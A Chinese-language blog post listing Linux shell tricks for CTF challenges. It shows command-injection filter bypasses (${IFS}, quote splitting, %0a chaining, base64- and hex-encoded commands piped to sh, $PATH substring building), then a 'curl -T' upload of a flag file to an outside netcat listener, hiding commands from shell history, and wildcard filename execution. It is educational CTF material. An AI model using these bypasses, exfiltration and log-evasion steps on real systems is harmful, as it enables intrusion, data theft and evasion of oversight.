---
layout: post
title: Some tricks of Linux in CTF 
comments: false
description: "CTF中大多数环境搭建在 Linux 平台上，从而有了许多可借助的技巧来考察"
keywords: "Tricks"
---

## 特殊符号绕过

**场景一：限制空格**

假如需要实现 **cat flag.txt** 命令读取flag：

1.利用 **<>** 重定向符：

![20170221143830.png](/assets/images/2017-02-12/3100098584.png)

2.利用 **${IFS}** 变量（内部域分隔符）：

![20170221143859.png](/assets/images/2017-02-12/2156314216.png)

3.利用 **{,}** 来代替：

![20170302224603.png](/assets/images/2017-02-12/560179516.png)

4.利用 **$IFS$9**：

**场景二：不允许指定命令执行**

假如需要执行 **uname** 命令，但过滤掉了 uname 字符：

1.利用参数拼接（黑名单绕过）：

![20170221144301.png](/assets/images/2017-02-12/4063339748.png)

2.利用 **‘ “** 单、双引号（碰到 escapeshellcmd() 时有效bypass）：

![20170221144302.png](/assets/images/2017-02-12/3875299444.png)

单、双引号成对出现不过滤，表示空字符串；

3.利用 **\`** 小引号，就是Tab上那个引号：

![20170222193358.png](/assets/images/2017-02-12/1716367324.png)

如果一串命令中存在\`\`，会先执行引号内的命令；

这也就是利用DNS传数据的利用点；

4.利用转移符号 **\\** 反斜线来绕过：

![2017053010454701.png](/assets/images/2017-02-12/210620643.png)

**场景三：一次执行多个命令**

假如需要执行 **uname **和**id** 命令：

1.利用shell脚本结束符 **;** 分号：

![20170221145654.png](/assets/images/2017-02-12/257350939.png)

2.利用逻辑符号 **| || & &&**：

![20170221144831.png](/assets/images/2017-02-12/3980873030.png)

3.在Web页面执行时可以利用回车的url编码 **%0a** 来绕过：

![20170221162118.png](/assets/images/2017-02-12/2766729364.png)

类似于在shell脚本下放两条命令；

## 命令编码绕过

base64：

```
root@L4oZu1:~# printf "whoami" | base64
d2hvYW1p
root@L4oZu1:~# printf "d2hvYW1p" | base64 -d | sh
root
```

xxd（16进制）:

```
root@L4oZu1:~# printf "whoami" | xxd -p
77686f616d69
root@L4oZu1:~# printf "77686f616d69" | xxd -r -p | sh
root
```

## 字符替换

Linux：

```
root@L4oZu1:~# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@L4oZu1:~# echo ${PATH:9:1}
l
root@L4oZu1:~# echo ${PATH:9:1}${PATH:11:1}
ls
root@L4oZu1:~# ${PATH:9:1}${PATH:11:1} 
Desktop  公共  模板  视频  图片  文档  下载  音乐  桌面
如果过滤了冒号:
root@L4oZu1:~# echo $(expr substr $PATH 1 1)
/
root@L4oZu1:~# echo $(expr substr $PATH 2 1)
u
```

Windows：

```
E:\1-main\0x01\exp\clone
λ echo %PATH%
E:\bodkin\cmder\bin;---

E:\1-main\0x01\exp\clone
λ echo %PATH:~7,1%
i

E:\1-main\0x01\exp\clone
λ echo %PATH:~7,1%%PATH:~5,1%
id

E:\1-main\0x01\exp\clone
λ %PATH:~7,1%%PATH:~5,1%
uid=197608(L4oZu1) gid=197121 groups=197121
```

Linux：${PATH~: a :b}

Windows：%PATH:~a,b%

其中a表示从a位开始，b表示截取的长度；

## curl -T 上传文件

利用`curl -T`来上传文件到主机并通过监听来拿文件内容：

Linux服务器：

```
root@L4oZu1:/var/www/html# cat flag.txt 
flag{456b7016a916a4b178dd72b947c152b7}
root@L4oZu1:/var/www/html# curl -T ./flag.txt http://192.168.2.101:2222
...
```

Windows主机：

```
E:\1-main\0x01\exp\clone
λ nc.exe -l -vv -p 2222
listening on [any] 2222 ...
192.168.2.102: inverse host lookup failed: h_errno 11004
connect to [192.168.2.101] from (UNKNOWN) [192.168.2.102] 51096
PUT /flag.txt HTTP/1.1
Host: 192.168.2.101:2222
User-Agent: curl/7.52.1
Accept: */*
Content-Length: 39
Expect: 100-continue

flag{456b7016a916a4b178dd72b947c152b7}
 sent 0, rcvd 171
```

curl不仅仅可以下载文件，还可以上传文件，通过内置option -T来实现；

就可以利用curl的这个功能来将文件PUT上传给我们的主机，由于`PUT method`是基于HTTP协议的，所以主机需要支持web服务，然后带上端口；

通过监听主机相应的端口号`nc.exe` -l -vv -p 2222，即可拿到文件内容；

## 防止命令被记录

在终端执行的每一条命令都会被记录在 history 文件中？

不是的，如果在命令前加个`空格`，则会不被记录；

并且前后重复的命令不会被记录；

![20171204150542.png](/assets/images/2017-02-12/2501212090.png)

note：

debain系可以，centos系不行；

## 利用文件名执行命令

`*`是Linux下的通配符，它会将符合模式的文件列出来，之后执行；

```
➜  ls
➜  touch bash
➜  echo id >> z.sh
➜  ls
bash z.sh
➜  *
uid=501(go0s) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
```
